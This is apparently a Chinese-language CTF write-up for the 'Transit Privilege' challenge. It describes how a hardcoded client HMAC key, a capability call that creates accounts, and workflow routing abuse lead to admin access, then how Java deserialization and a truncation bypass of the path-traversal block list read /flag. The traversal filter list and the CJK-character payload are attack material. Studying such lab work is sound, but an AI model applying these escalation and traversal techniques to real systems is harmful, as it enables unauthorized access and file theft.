# Transit Privilege

## Description

A certain operations console is used to manage edge nodes, maintenance tasks, and diagnostic reports. So, what's the problem with the analysis?

## Author

lhRaMk7

## solutions

这题刚拿到的时候，网页表面上其实没什么好看的，就是一个普通登录页。能摸到的接口也很少，像 `/login`、`/admin/me`、`/api/status` 这种，`/api/status` 回的东西也很普通：

```json
{
  "name": "Transit Privilege",
  "login": "POST /login",
  "dashboard": "GET /admin/me",
  "notice": "database-backed auth is enabled"
}
```

附件里是一个 `edge-agent-client-0.1.0.jar`，反编译以后很快能看出来，这东西不是在调普通的后台接口，而是会把目标地址转成 `ws://host/proxy`。再顺着客户端逻辑往下看，整个流程也比较清楚，就是 `HELLO -> AUTH -> DESCRIBE -> CALL` 这一套。签名材料也都在 jar 里写死了，包括那串固定 key：

```text
6Ziy5ZCb5a2Q5LiN5aao5bCP5Lq6ISEh
```

以及 `AUTH`、`CALL` 的拼接规则和 HMAC 算法。到这里其实就已经能判断，题目第一段真正要打的不是网页，而是 `/proxy` 这层协议。

把 `HELLO` 和 `AUTH` 跑通以后，再去看 `DESCRIBE` 返回的能力范围，会有一个点很扎眼，就是 `cap.sync`。它不是那种普通的一次性调用，而是明显带协商过程的，后面还有 ticket 和 proof，这种接口一般副作用都不会太小。当时也不是一眼就认定它能建用户，而是先拿它本身做了一轮边界测试。它这边有三个比较显眼的字段：`identity`、`principal`、`secret`。光看名字其实还不够，但继续发包会发现 `secret` 不是随便传都收。故意传一个弱一点的值，服务端会直接回这种东西：

```json
{
  "ok": false,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "rejected",
  "reason": "password must be at least 8 characters and include letters and digits"
}
```

看到这个报错，其实就差不多了。因为这已经不是普通配置字段的检查方式，更像是在按密码处理。再结合 `principal` 这个名字，思路自然就会往“创建用户”或者“绑定一组登录凭据”上走。

实际走这个流程时，先连 `/proxy` 发一个：

```json
{"type":"HELLO"}
```

服务端会回：

```json
{
  "ok": true,
  "type": "HELLO_ACK",
  "nonce": "22cc0466020d482e96cc6b1e902bc0d5",
  "profile": "edge-v3",
  "routeEpoch": "rt-a82a95ad0bab",
  "challenge": "b3de52e9e149245f"
}
```

这里后面要用到的是 `nonce`、`profile`、`routeEpoch`。然后按 jar 里给的规则做 `AUTH`，成功以后再发：

```json
{
  "type": "DESCRIBE",
  "source": "Transit",
  "scope": "edge.capability"
}
```

回包里能看到：

```json
{
  "scope": "edge.capability",
  "operations": [
    {
      "name": "cap.sync",
      "routeId": 1724737265,
      "required": ["identity", "principal", "secret"],
      "mode": "negotiated-bind"
    }
  ]
}
```

接着先给它一组候选身份，比如：

```json
{
  "identity": "edge-a1b2c3d4",
  "principal": "ua3e351ca84",
  "secret": "Aa910334b81f0614"
}
```

服务端不会一步成功，而是回：

```json
{
  "ok": true,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "proof_required",
  "ticket": "1e14737afe79853cdb",
  "resumeScope": "edge.capability.ticket",
  "missing": ["ticket", "proof"]
}
```

这个回包基本已经把后面的方向说透了：当前流程没失败，服务端给了 `ticket`，接下来切到 `edge.capability.ticket` 继续补 `proof` 就行。后面再按客户端里的规则把 proof 算出来，带着 `identity`、`principal`、`secret`、`ticket`、`proof` 再发一次，成功回包大致是这样：

```json
{
  "ok": true,
  "operation": "cap.sync",
  "profile": "edge-v3",
  "state": "linked",
  "scope": "operator-console",
  "bindingId": "bind-942851708",
  "principal": "ua3e351ca84"
}
```

这里真正关键的是：

```json
"scope": "operator-console"
```

这说明这组身份已经不是内部协商对象，而是被挂到后台控制台这条身份域上了。拿这组 `principal/secret` 去登录网页，确实能进，而且角色是 `OPERATOR`。

接下来这题不会直接把很明显的后台入口摆给你，真正有价值的是：

```text
GET /api/workspace/bootstrap
```

它会返回一组当前会话可用的 actionId，例如：

```json
{
  "workflow": {
    "draftActionId": "12aa370d-365f-44ed-9c28-31db1cda29c2",
    "previewActionId": "0a7e788c-68da-4050-a390-1bfba909638d",
    "submitActionId": "4bdd3e48-4bb6-4859-96a4-bc0785b168c8",
    "advanceActionId": "16a4b417-bda6-429e-b207-6cd850183685"
  }
}
```

这一步挺关键，因为它说明前端真正用的是一层 facade：

```text
POST /api/workspace/action
```

所以后面提权不该再去猜什么旧接口，而是顺着这套工作流走。先起一个 draft，第一次回包不是直接完成，而是：

```json
{
  "ok": true,
  "state": "ROUTING_REQUIRED",
  "draftRef": "wf-7d4996a260cd"
}
```

这就说明 reviewer 或 lane 不是固定死的，还要继续经过 routing。再去做 preview，会拿到一组比较含蓄但足够用的提示：

```json
{
  "ok": true,
  "state": "ROUTING_REQUIRED",
  "schema": {
    "fields": ["policyRef", "routing"],
    "profiles": ["desk", "delegate"]
  },
  "note": "handoff remains policy-scoped",
  "compat": "retained resolver aliases may still bind"
}
```

虽然这里没把后台逻辑明牌出来，但几个关键词已经很够了，尤其是 `policyRef`、`routing`、`handoff`、`retained` 这些。做到这里时，比较自然的想法就是：既然 reviewer 是在这一步决出来的，那能不能把这个流程收回到自己身上。

真正能起作用的是这样一组 routing 元数据：

```json
{
  "draftRef": "wf-7d4996a260cd",
  "policyRef": "desk-default",
  "routing": {
    "mode": "retain",
    "handoff": "owner"
  }
}
```

提交以后，队列里会出现一条新记录，lane 落到 `retain`。再用 `advanceActionId` 去推进它，把状态推成 `APPROVED`，然后再看：

```text
GET /admin/me
```

回包已经变成：

```json
{
  "username": "ua3e351ca84",
  "role": "ADMIN"
}
```

也就是说，前半段到这里已经跑通了，后面的目标就是找最后的读旗点。

拿到管理员以后，这题最值钱的地方不是继续盲扫，而是先看后台有没有把更多实现信息自己暴露出来。这个题的“黑盒转白盒”入口就在 backup 功能里。访问：

```text
GET /api/backup/list
```

能看到一条很有价值的记录：

```json
[
  {
    "name": "support-source",
    "state": "ready",
    "profile": "server-source",
    "note": "Server support snapshot with packaged service jar."
  }
]
```

这条已经说得很直白了：profile 是 `server-source`，note 里也明确写了里面是 packaged service jar。继续走 `create` 和 `fetch`，能拿到 `server-source.zip`。这个包里只有一个服务端 jar：

```text
ops-console-demo-0.1.0.jar
```

从这一步开始，题目后半段才正式转成源码分析。

拿到这个 jar 以后，先搜几个最自然的关键词，比如 `reconcile`、`ObjectInputStream`、`readObject`，很快就能定位到：

```text
/admin/maintenance/reconcile
```

这里会接收一个 Base64 的 zip，解包后找 `manifest.json` 和 `inventory.dat`，然后对 `inventory.dat` 做原生 Java 反序列化。顺着这条链往下看，最关键的类是：

```text
ctf.sctf.ops.maintenance.InventoryCursorEntry
```

这个类的 `readObject()` 在反序列化时会直接继续调用：

```text
ProbeSandbox.renderSnapshot(name, profile, cursor)
```

而且这一步的输出还会被写进 maintenance report。也就是说，这里同时具备两件事：一是对象一旦被反序列化就能进逻辑，二是结果最后还能从 report 里读回来，所以它自然就成了后半段最合适的入口。

继续看 `ops-console-demo-0.1.0.jar` 里的 `ctf.sctf.ops.maintenance.ProbeSandbox`，后半段真正的问题也就清楚了。`InventoryCursorEntry.readObject()` 把 `cursor` 和 `profile` 传进来以后，`renderSnapshot()` 在 `profile=merge` 时会走到这样一条链：

```text
BridgeIndexRenderer.renderProfile(...)
-> LegacyCursorAdapter.flattenToken(cursor)
-> IndexSnapshotStore.readSegment(storageToken)
```

问题就出在 `LegacyCursorAdapter.flattenToken()`。这个方法不是直接拿原始 `cursor` 去读文件，而是先遍历字符串里的每个字符，然后调用：

```java
private static byte bridgeOctet(char codeUnit) {
    return (byte) codeUnit;
}
```

也就是说，每个 Java `char` 在这里都会被强制截成一个 `byte`，只保留低 8 位。随后 `flattenToken()` 再用 `ISO_8859_1` 把这些字节重新拼回字符串。到这里，前面过滤逻辑看到的“可见字符串”和后面真正参与路径解析的“物化字符串”就已经不是同一个东西了。

再回头看过滤逻辑，它表面上是在拦路径穿越，比如会检查：

- `../`
- `./`
- `%2e%2e`
- `..%2f`
- `%u002e`

但它检查的是原始可见字符串。如果某些 Unicode 字符本身看起来不是 `.`、`/`，但它们的低 8 位刚好等于 `.`、`/`，那前面检查能过，后面 `flattenToken()` 物化出来的却会是真正的路径字符。

这题里就是这么做的。比如：

- `售` 的低 8 位会变成 `.`
- `启` 的低 8 位会变成 `/`
- `书`、`公`、`卡`、`剧` 的低字节分别能对应 `f`、`l`、`a`、`g`

所以表面上看是一串正常汉字：

```text
售售启售售启售售启书公卡剧
```

但经过 `LegacyCursorAdapter.flattenToken()` 以后，会被物化成：

```text
../../../flag
```

后面再结合 report 根目录去做 `resolve().normalize()`，最终就会落到：

```text
/flag
```

剩下的事情就比较直接了。把构造好的 `InventoryCursorEntry` 放进导入 zip 的 `inventory.dat`，再配一份合法的 `manifest.json`，整体 Base64 后提交到：

```text
POST /admin/maintenance/reconcile
```

服务端会返回一个 `importId`，然后去访问：

```text
GET /admin/maintenance/reports?importId=<importId>
```

最终就能在 report 里看到结果。实际拿到的 flag 是：

```text
SCTF{Tr4ns1t_Pr0b3_4107_M@sTer}
```

这题如果回头看，单个点其实都不算特别离谱。真正麻烦的是它把这些东西拆开藏在不同层里：前半段用客户端 jar 把协议露出来，后台提权埋在 workspace 这种不太起眼的 facade 里，源码又不是一开始就给，而是得自己拿管理员后从 backup 里取，最后的读旗点也不是直白的 `../`，而是落在了一次表示层不一致上。顺着这个思路往下走，整条链会比较顺；如果一开始方向偏了，确实会多花不少时间。
